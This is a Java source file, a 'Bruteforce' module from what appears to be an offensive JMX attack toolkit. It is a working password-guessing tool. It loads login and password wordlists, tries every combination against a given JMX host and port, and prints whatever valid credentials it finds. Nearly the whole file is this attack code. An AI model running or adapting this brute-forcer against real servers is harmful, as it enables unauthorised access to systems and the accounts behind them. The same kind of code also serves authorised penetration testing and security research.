package jmxattacks;

import java.io.FileNotFoundException;
import java.io.FileReader;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import jmxmenus.MainMenu;
import jmxutils.Connexion;
import jmxutils.EasyBasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class Bruteforce extends Attack{

	
	String description = "This module will bruteforce logins/passwords";
	String name = "Bruteforce";
	private String logins;
	private String passwords;
	private String host;
	private String port;
	private List<String> list_logins ;
	private List<String> list_passwords ;
	private List<String> credentials ;
	
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--host localhost --port 8050 --login_file logins.txt --pass_file password.txt";
	
	
	public Bruteforce()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);
	}

	public void prepareExploit(String arg)
	{
		
		this.setAttack_description(description);
		this.setAttack_name(name);	
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			}
					
			if (line != null)
			{
				this.logins = line.getOptionValue("login_file");
			    this.passwords = line.getOptionValue("pass_file");
			    this.list_logins= new ArrayList<String>();
			    this.list_passwords= new ArrayList<String>();
			    this.port = line.getOptionValue("port");
			    this.host = line.getOptionValue("host");
			    setList(this.list_logins,this.logins);
			    setList(this.list_passwords,this.passwords);
			    this.exploit();
			}
			    
			    
	}
	private void setList(List<String> list,String file)
	{
		try {
			Scanner scanner = new Scanner(new FileReader(file));
			 
			 while (scanner.hasNextLine()) {
			     list.add(scanner.nextLine());
			 }
		} catch (FileNotFoundException e) {
			System.out.println("\nERROR " +e.getMessage());
		}
	}
	
	public void prepareExploit() {
		
		System.out.println(this.name+" exploit selected");
		
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			
			if (line != null)
			{
			    this.logins = line.getOptionValue("login_file");
			    this.passwords = line.getOptionValue("pass_file");
			    this.list_logins= new ArrayList<String>();
			    this.list_passwords= new ArrayList<String>();
			    this.port = line.getOptionValue("port");
			    this.host = line.getOptionValue("host");
			    setList(this.list_logins,this.logins);
			    setList(this.list_passwords,this.passwords);
			    this.exploit();
			}
			MainMenu menu = new MainMenu();
		
	}

	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		 options.addOption(OptionBuilder
			       .withArgName("host")
			       .withLongOpt("host")
			       .hasArg()
			       .isRequired()
			       .withDescription("JMX server")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("port")
			       .hasArg()
			       .isRequired()
			       .withDescription("JMX port")
			       .withLongOpt("port")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("login_file")
			       .withLongOpt("login_file")
			       .hasArg()
			       .isRequired()
			       .withDescription("login_file")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("pass_file")
			       .withLongOpt("pass_file")
			       .hasArg()
			       .isRequired()
			       .withDescription("password_file")
			       .create());
		   
		   
		   
		   return options;
	}
	
	public void exploit()
	{
		Connexion conn = null;
		Iterator<String> login_it = this.list_logins.iterator();
		 this.credentials  = new ArrayList<String>();
		while(login_it.hasNext()){
			
			Iterator<String> pass_it = this.list_passwords.iterator();
			String login = login_it.next().toString();
			System.out.println("Bruteforce password for " + login+"");
			int nb = 0;
			int nb_pass=this.list_passwords.size();
			boolean continu=true;
			while(pass_it.hasNext() && continu)
			{
				String pass = pass_it.next().toString();
				conn = new Connexion(this.host,this.port,login,pass,false);
				nb=nb+1;	
				if(conn.isState()) 
				{
				System.out.println("Valids credentials found\n"+login+" " + pass);
				continu = false;
				this.credentials.add(login+":"+pass);
				}
				
				if (nb % 10 == 0)
				{
					System.out.println("tested " + nb + "/" +nb_pass + " passwords for user " + login);
				}
			}
			
		}
		
		
		System.out.print("\n");
		if (!this.credentials.isEmpty())
		{
			Iterator it = this.credentials.iterator();
			System.out.println("List of credentials found");
			while (it.hasNext())
			{
				System.out.println(it.next().toString());
			}
		}
		
		
	}
	
}
